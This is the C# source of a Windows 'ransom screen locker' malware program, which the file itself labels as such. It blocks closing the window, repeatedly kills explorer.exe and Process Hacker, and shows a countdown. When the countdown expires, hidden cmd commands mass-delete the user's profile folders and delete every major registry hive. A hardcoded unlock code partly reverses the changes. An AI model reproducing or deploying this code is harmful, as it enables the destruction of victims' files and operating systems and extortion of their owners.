using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.Media;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Blocker
{
    public partial class MalwareWindow : Form
    {
        SoundPlayer music;
        public MalwareWindow()
        {
            InitializeComponent();
            music = new SoundPlayer(@"C:\Program Files\temp\music.wav");
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)

        {

            /*Credits by Cyber Soldier*/
            /*Créditos ao Cyber Soldier*/
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        int tempo = 3600;
        string localvirus = @"c:\program files\temp";
        private void MalwareWindow_Load(object sender, EventArgs e)
        {
            if (!File.Exists(localvirus + @"\reini2death.msi"))
            {
                File.Create(localvirus + @"\reini2death.msi");
            }
            music.PlayLooping();
            time.Text = tempo.ToString();
            tempotk.Start();
            regraschk.Start();
        }

        private void MalwareWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            /*anti alt+f4*/
            e.Cancel = true;
        }

        private void unlock_Click(object sender, EventArgs e)
        {
            var deskt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if (code.Text == "")
            {
                MessageBox.Show("Insira um código válido!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            else if (code.Text == "1KPX79TVKPEHNWRMGV87KSXMFVDQNHYV43SLY0TNFTT6YWBDTM")
            {
                File.Create(@"C:\Program Files\Temp\salvation.msi");
                MessageBox.Show("Código correto!, todas as alterãções serão desfeitas!", "Parabéns!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                /*revertendo alterações*/
                Extract("Blocker", deskt + @"\", "Resources", "RECUP.reg");
                Extract("Blocker", deskt + @"\", "Resources", "unins000.exe");
                File.WriteAllText(deskt + @"\REMOVE.txt", "         SIGA O PASSO A PASSO PRA REMOVER TOTALMENTE" + Environment.NewLine + Environment.NewLine + "1- Execute o arquivo RECUP.reg para desfazer algumas alterações no registro" +
                    "" + Environment.NewLine + Environment.NewLine + "2- Execute o arquivo UNINS000.exe" + Environment.NewLine + Environment.NewLine + "3- Agora inicie o gerenciador de tarefas com CTRL+SHIFT+ESC e inicie o EXPLORER.exe" +
                    "" + Environment.NewLine + Environment.NewLine + "4- Reinicie o PC." + Environment.NewLine + Environment.NewLine + Environment.NewLine + "E pronto, está livre!");

                /*descorrompendo o registro*/
                RegistryKey tsmgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                tsmgr.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);

                /*desabilitar o controle de usuário*/

               /*RegistryKey lua = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                lua.SetValue("EnableLUA", 1, RegistryValueKind.DWord);*/

               /* RegistryKey filter = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                filter.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);*/

               /* RegistryKey adm = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                adm.SetValue("ConsentPromptBehaviorAdmin", 2, RegistryValueKind.DWord); */


                /*para revover da inicialização do sistema*/

                RegistryKey ini = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                ini.SetValue(@"Blocker", @" exclua esse valor");

                RegistryKey userinit = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                userinit.SetValue("logon", @" exclua esse valor ");

                /*terão mais alterações em breve*/
                
                
                /*Instruções para remover o malware totalmente*/
                MessageBox.Show("ANTES DE SAIR, LEIA COM ATENÇÃO!\n\nAO REINICIAR O SEU PC, ELE PROVAVELMENTE EXIBIRÁ UMA TELA PRETA POR SEQUELA DO VIRUS.\n\nPARA CONSERTAR ISSO BASTA LER AS INSTUÇÕES NO ARQUIVO [=> REMOVE.TXT <=] QUE ESTARÁ NA SUA ÁREA DE TRABALHO.\n\nPARA SE LIVRAR 100% DO MALWARE. \n\nBOM, EU ACHO QUE É ISSO, FLW (;", "PRESTE BEM ATENÇÃO!", MessageBoxButtons.OK, MessageBoxIcon.Information);

                ProcessStartInfo shutdown = new ProcessStartInfo();
                shutdown.FileName = "cmd.exe";
                shutdown.Arguments = "/k shutdown /r /f /t 00";
                shutdown.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(shutdown);

            }

            else
            {
                MessageBox.Show("Código inválido!", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
           /* Thread checkcode = new Thread(Check_code);
            checkcode.Start();*/
        }

       

        private void code_TextChanged(object sender, EventArgs e)
        {

        }
        
        
        private async void tempotk_Tick(object sender, EventArgs e)
        {
            /*time*/
            time.Text = tempo.ToString();
            tempo--;

            if (tempo == -1)
            {
                /*destruição total*/
                tempotk.Stop();


                /*Nova thread destruindo e excluindo tudo*/
                await Task.Run(() => Destroyer_sys()); 
               
                music.Stop();
                this.Hide();
                mbr mbr = new mbr();
                mbr.Show();
                Rsod rsod = new Rsod();
                rsod.ShowDialog();
                
                
                /*novo form RSOD*/
               
            }
        }

        public void Destroyer_sys()
        {
                ProcessStartInfo delfiles = new ProcessStartInfo();
                delfiles.FileName = "cmd.exe";
                delfiles.Arguments = @"/k del /f /s /q %USERPROFILE%\ && del /f /s /q %USERPROFILE%\Documents && del /f /s /q %USERPROFILE%\Pictures && del /f /s /q %USERPROFILE%\Downloads && del /f /s /q %USERPROFILE%\Desktop";
                delfiles.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(delfiles);
                
                
                ProcessStartInfo regdestr = new ProcessStartInfo();
                regdestr.FileName = "cmd.exe";
                regdestr.Arguments = @"/k reg delete HKCR /f && reg delete HKCU /f && reg delete HKLM /f && reg delete HKEY_USERS /f";
                regdestr.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(regdestr);

        }
        private void dc_MouseEnter(object sender, EventArgs e)
        {
            Cursor = Cursors.Hand;
            dcname.Show();
        }

        private void dc_DragLeave(object sender, EventArgs e)
        {
            
        }

        private void dc_MouseLeave(object sender, EventArgs e)
        {
            Cursor = Cursors.Default;
            dcname.Hide();
        }

        private void info_MouseHover(object sender, EventArgs e)
        {
            txtinfo.Show();
        }

        private void info_MouseEnter(object sender, EventArgs e)
        {
            Cursor = Cursors.Hand;
        }

        private async void info_MouseLeave(object sender, EventArgs e)
        {
            Cursor = Cursors.Default;
            await Task.Delay(250);
            txtinfo.Hide();
        }

        private void info_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Virus criado por Waguinho para testes. \n\nLinguagem: c#, batch.\n\nCategoria: Ransom screen locker\n\nData de criação: 08/2024.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
            return;
        }

        private void regraschk_Tick(object sender, EventArgs e)
        {
            Process[] explorer = Process.GetProcessesByName("Explorer");
            Process[] phacker = Process.GetProcessesByName("ProcessHacker");
            //Process[] cmd = Process.GetProcessesByName("cmd");

           
            
            if (explorer.Length > 0)
            {
                ProcessStartInfo exp = new ProcessStartInfo();
                exp.FileName = "cmd.exe";
                exp.Arguments = "/k taskkill /f /im explorer.exe";
                exp.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(exp);
            }

            if(phacker.Length > 0)
            {
                ProcessStartInfo phck = new ProcessStartInfo();
                phck.FileName = "cmd.exe";
                phck.Arguments = "/k taskkill /f /im ProcessHacker.exe";
                phck.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(phck);
            }
            
        }

        private void leiame_Click(object sender, EventArgs e)
        {
            /**novo form*/

            Readme readme = new Readme();
            readme.ShowDialog();
        }

        private void rules_Click(object sender, EventArgs e)
        {
            Rules rules = new Rules();
            rules.ShowDialog();
        }
    }
}
